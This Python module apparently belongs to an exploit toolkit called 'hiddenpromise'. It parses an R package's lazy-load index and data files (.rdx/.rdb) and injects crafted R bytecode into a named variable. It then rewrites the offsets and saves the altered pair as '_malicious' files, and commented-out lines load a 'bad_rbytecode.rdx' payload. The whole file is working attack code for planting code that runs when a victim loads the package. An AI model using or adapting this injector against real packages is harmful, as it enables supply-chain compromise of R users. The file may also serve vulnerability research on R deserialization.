from hiddenpromise.compiler import Compiler, Opcode, TYPES
from hiddenpromise.parser import Parser, RObjectType
import gzip, zlib

def get_addresses(parsed):
    obj = parsed.object

    addresses = {}

    function_names = obj.value[0].attributes.value[0].value
    for i, function_address in enumerate(obj.value[0].value):
        addresses[function_names[i].value] = {"offsets": function_address.value}

    environment_names = obj.value[1].attributes.value[0].value
    for i, environment_address in enumerate(obj.value[1].value):
        addresses[environment_names[i].value] = {"offsets": environment_address.value}

    return addresses

def get_keys_in_order(dictionary):
    sorted_keys = sorted(dictionary.keys(), key=lambda k: dictionary[k]["offsets"][0])
    return sorted_keys

def check_lengths(dictionary, keys):
    cur_start = 0
    for k in keys:
        start = dictionary[k]["offsets"][0]
        length = dictionary[k]["offsets"][1]
        data = dictionary[k]["compressed_data"]

        if cur_start != start:
            dictionary[k]["offsets"][0] = cur_start
            print("updated start", k)

        if length != len(data):
            dictionary[k]["offsets"][1] = len(data)
            length = len(data)
            print("updated length", k)

        cur_start += length


def create_vector_1(data, sorted_keys):
    ints = []
    chars = []

    for key in sorted_keys:
        if b"env::" not in key:
            ints.append(
                Opcode(
                    TYPES.INTSXP, 0, False, False, False, data[key]["offsets"], False
                ),
            )
            chars.append(
                Opcode(
                    TYPES.CHARSXP, 64, False, False, False, key.decode("utf-8"), False
                ),
            )

    instructions = [
        Opcode(TYPES.VECSXP, 0, False, True, False, len(ints), False),
    ]
    instructions.extend(ints)
    instructions.extend(
        [
            Opcode(TYPES.LISTSXP, 0, False, False, True, None, False),
            Opcode(TYPES.SYMSXP, 0, False, False, False, None, False),
            Opcode(TYPES.CHARSXP, 64, False, False, False, "names", False),
            Opcode(TYPES.STRSXP, 0, False, False, False, len(chars), False),
        ]
    )
    instructions.extend(chars)
    instructions.append(Opcode(TYPES.NILVALUE_SXP, 0, False, False, False, None, False))
    return instructions


def create_vector_2(data, sorted_keys):
    ints = []
    chars = []

    for key in sorted_keys:
        if b"env::" in key:
            ints.append(
                Opcode(
                    TYPES.INTSXP, 0, False, False, False, data[key]["offsets"], False
                ),
            )
            chars.append(
                Opcode(
                    TYPES.CHARSXP, 64, False, False, False, key.decode("utf-8"), False
                ),
            )

    instructions = [
        Opcode(TYPES.VECSXP, 0, False, True, False, len(ints), False),
    ]
    instructions.extend(ints)
    instructions.extend(
        [
            Opcode(TYPES.LISTSXP, 0, False, False, True, None, False),
            Opcode(TYPES.SYMSXP, 0, False, False, False, None, False),
            Opcode(TYPES.CHARSXP, 64, False, False, False, "names", False),
            Opcode(TYPES.STRSXP, 0, False, False, False, len(chars), False),
        ]
    )
    instructions.extend(chars)
    instructions.append(Opcode(TYPES.NILVALUE_SXP, 0, False, False, False, None, False))
    return instructions


def create_rdx(data, sorted_keys):
    instructions = [Opcode(TYPES.VECSXP, 0, False, True, False, 3, False)]
    instructions.extend(create_vector_1(data, sorted_keys))
    instructions.extend(create_vector_2(data, sorted_keys))
    instructions.extend(
        [
            Opcode(TYPES.LGLSXP, 0, False, False, False, [1], False),
            Opcode(TYPES.LISTSXP, 0, False, False, True, None, False),
            Opcode(TYPES.REFSXP, 0, True, False, False, 0, False),
            Opcode(TYPES.STRSXP, 0, False, False, False, 3, False),
            Opcode(TYPES.CHARSXP, 64, False, False, False, "variables", False),
            Opcode(TYPES.CHARSXP, 64, False, False, False, "references", False),
            Opcode(TYPES.CHARSXP, 64, False, False, False, "compressed", False),
            Opcode(TYPES.NILVALUE_SXP, 0, False, False, False, None, False),
        ]
    )
    return instructions

def create_rdb_file(data, sorted_keys):
    s = b""

    for k in sorted_keys:
        s += data[k]["compressed_data"]

    return s


def create_compressed_data(data):

    length = len(data)

    data = zlib.compress(data)

    return length.to_bytes(4, "big") + data


# def create_instructions(data):
#     sorted_keys = get_keys_in_order(data)
#     check_lengths(data, sorted_keys)
#     instructions = create_rdx(data, sorted_keys)
#     rdx_file_data = gzip.compress(Compiler.craft_file(instructions))
#     open("fixr.rdx", "wb").write(rdx_file_data)
#     open("fixr.rdb", "wb").write(create_rdb_file(data, sorted_keys))


# # for key in get_keys_in_order(package_rep):
# #     package_rep[key]["compressed_data"] = create_compressed_data(
# #         open("out.rds", "rb").read()
# #     )

# package_rep[b"env::1"]["compressed_data"] = create_compressed_data(
#     open("bad_rbytecode.rdx", "rb").read()
# )

# create_instructions(package_rep)


def inject_code(rdx_path, rdb_path, variable_name, instructions):
    rdx_data = open(rdx_path, "rb").read()
    rdb_data = open(rdb_path, "rb").read()
    rdx_parsed = Parser(rdx_data).parse()

    if rdx_parsed.object.info.type != RObjectType.VEC:
        print("RDX file not a vector")
        return
    
    addresses = get_addresses(rdx_parsed)

    for address in addresses:
        start = addresses[address]["offsets"][0]
        length = addresses[address]["offsets"][1]

        addresses[address]["compressed_data"] = rdb_data[start:start+length]

        if address == variable_name:
            addresses[address]["compressed_data"] = create_compressed_data(Compiler.craft_file(instructions))

    sorted_keys = get_keys_in_order(addresses)
    check_lengths(addresses, sorted_keys)
    instructions = create_rdx(addresses, sorted_keys)
    new_rdx_data = gzip.compress(Compiler.craft_file(instructions))
    open(rdx_path.replace(".rdx", "_malicious.rdx"), "wb").write(new_rdx_data)
    open(rdb_path.replace(".rdb", "_malicious.rdb"), "wb").write(create_rdb_file(addresses, sorted_keys))